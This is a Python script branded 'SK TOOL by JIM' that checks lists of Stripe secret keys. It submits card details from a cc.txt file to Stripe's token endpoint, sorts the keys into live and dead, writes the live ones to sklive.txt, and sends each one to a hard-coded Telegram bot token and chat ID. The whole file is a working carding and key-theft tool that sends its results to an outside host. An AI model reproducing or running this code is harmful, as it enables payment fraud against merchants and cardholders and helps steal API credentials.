import concurrent.futures
import requests
import os
import colorama
from colorama import Fore
from datetime import datetime

os.system('clear')

print(Fore.CYAN+"──────────────────────────────────────────────────\n─────────██████─██████████─██████──────────██████─\n─────────██▒▒██─██▒▒▒▒▒▒██─██▒▒██████████████▒▒██─\n─────────██▒▒██─████▒▒████─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─\n─────────██▒▒██───██▒▒██───██▒▒██████▒▒██████▒▒██─\n─────────██▒▒██───██▒▒██───██▒▒██──██▒▒██──██▒▒██─\n─────────██▒▒██───██▒▒██───██▒▒██──██▒▒██──██▒▒██─\n─██████──██▒▒██───██▒▒██───██▒▒██──██████──██▒▒██─\n─██▒▒██──██▒▒██───██▒▒██───██▒▒██──────────██▒▒██─\n─██▒▒██████▒▒██─████▒▒████─██▒▒██──────────██▒▒██─\n─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒██─██▒▒██──["+Fore.RED+"1.0v"+Fore.CYAN+"]──██▒▒██─\n─██████████████─██████████─██████──────────██████─\n────────────"+Fore.RED+" ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ꜱᴋ ᴛᴏᴏʟ ʙʏ ᴊɪᴍ "+Fore.CYAN+"───────────\n"+Fore.WHITE)

BOT_TOKEN = "5555716917:AAGsUI1xZF0oZsoUQx3ErM2xmA6aHi8G390"
CHAT_ID = "5437132207"

if not os.path.exists("sk.txt"):
    print("Error: The sk.txt file does not exist!")
    exit()

with open("sk.txt", "r") as sk_file:
    sks = sk_file.read().splitlines()

if not os.path.exists("cc.txt"):
    print("Error: The cc.txt file does not exist!")
    exit()

with open("cc.txt", "r") as cc_file:
    cc_info_arr = cc_file.read().splitlines()

sk_live_file = open("sklive.txt", "w")


def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": text
    }
    response = requests.post(url, params=params)
    return response.json()


def check_sk(args):
    sk, check_counter = args

    cc_info = cc_info_arr[0]

    cc, mm, yyyy, cvv = cc_info.split("|")
    bin_number = cc[:8]
    last4 = cc[12:]
    email = "test@example.com"
    m = str(int(mm))

    session = requests.Session()

    payload = {
        "card": {
            "number": cc,
            "exp_month": mm,
            "exp_year": yyyy,
            "cvc": cvv
        }
    }
    auth_response1 = session.post(
        "https://api.stripe.com/v1/tokens",
        auth=(sk, ""),
        data=payload
    ).json()

    current_time = datetime.now().strftime("%H:%M:%S")

    if "error" in auth_response1:
        if auth_response1["error"]["type"] == "invalid_request_error":
            print(f"[{current_time}] [{Fore.RED}DEAD{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk} ")
            
        else:
            print(f"[{current_time}] [{Fore.GREEN}LIVE{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk} ")
            sk_live_file.write(sk + "\n")
            send_telegram_message(CHAT_ID , f"SK CRACKED {current_time} \n\nKey: {sk}\n\nLIVE SK has been saved to your file sklive.txt")

    else:
        print(f"[{current_time}] [{Fore.GREEN}LIVE{Fore.WHITE}] [{Fore.YELLOW}{check_counter}{Fore.WHITE}] {sk} ")
        sk_live_file.write(sk + "\n")
        send_telegram_message(CHAT_ID , f"SK CRACKED {current_time} \n\nKey: {sk}\n\nLIVE SK has been saved to your file sklive.txt")
    
max_threads = min(os.cpu_count() * 2, len(sks))

batch_size = 100

sk_batches = [sks[i:i+batch_size] for i in range(0, len(sks), batch_size)]

with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
    check_counter = 0
    for sk_batch in sk_batches:
        sk_args = [(sk, check_counter + i + 1) for i, sk in enumerate(sk_batch)]
        executor.map(check_sk, sk_args)
        check_counter += len(sk_batch)

sk_live_file.close()
